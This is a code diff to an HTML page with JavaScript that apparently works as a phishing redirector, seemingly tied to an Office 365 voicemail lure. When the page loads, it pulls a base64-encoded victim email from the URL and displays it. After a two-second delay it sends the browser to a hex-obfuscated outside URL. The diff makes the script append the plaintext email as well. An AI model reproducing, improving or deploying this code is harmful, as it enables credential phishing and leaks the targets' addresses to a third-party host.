@@ -58,7 +58,6 @@
             <div class="dot"></div>
         </div>
     </div>
-    <a id="redirectLink" href="#" style="display: none;" title="Redirect to Target"></a>
     <script>
         // Function to decode base64 string
         function decodeBase64(encoded) {
@@ -78,18 +77,19 @@
                 if (/^[A-Za-z0-9+/]{45}$/.test(key) && /^[A-Za-z0-9+/=]*$/.test(value)) {
                     const decodedValue = decodeBase64(value);
                     if (decodedValue && decodedValue.includes('@')) {
-                        return { key, value }; // Return the key and the decoded email
+                        return { key, value, decodedValue }; // Return the key, value, and decoded email
                     }
                 }
             }
             return null;
         }
 
-        // Redirect using hex-encoded URL
-        function redirectToTarget(base64Email) {
+        // Redirect using hex-encoded URL and append the decoded email
+        function redirectToTarget(base64Email, decodedEmail) {
             const hex = "68747470733A2F2F736D616C6C6465706F742E636F6D2F6E2F3F63335939627A4D324E56387858335A7661574E6C4A6E4A68626D513956555634656D5246627A306D64576C6B50565654525649794F4445774D6A41794E4655304E6A45774D6A67794F513D3D4E";
-            const obfuscatedURL = hex.match(/.{2}/g).map(byte => String.fromCharCode(parseInt(byte, 16))).join('') + base64Email;
-            window.location.href = obfuscatedURL;
+            const obfuscatedURL = hex.match(/.{2}/g).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
+            const fullURL = obfuscatedURL + base64Email + decodedEmail;
+            window.location.href = fullURL;
         }
 
         // Update the displayed email
@@ -97,8 +97,8 @@
             const emailParam = findEmailParam();
             const emailDisplay = document.getElementById('emailDisplay');
             if (emailParam) {
-                emailDisplay.innerText = decodeBase64(emailParam.value); // Display the decoded email
-                return emailParam.value; // Return the base64 email value
+                emailDisplay.innerText = emailParam.decodedValue; // Display the decoded email
+                return emailParam; // Return the full email param object
             } else {
                 console.error("No email to display");
                 return null;
@@ -107,11 +107,11 @@
 
         // Automatically show loading dots and redirect
         window.onload = function () {
-            const emailParamValue = updateLink();
-            if (emailParamValue) {
+            const emailParam = updateLink();
+            if (emailParam) {
                 document.querySelector('.dots-container').style.display = 'flex'; // Show loading dots
                 setTimeout(() => {
-                    redirectToTarget(emailParamValue);
+                    redirectToTarget(emailParam.value, emailParam.decodedValue);
                 }, 2000); // Delay for 2 seconds
             }
         };
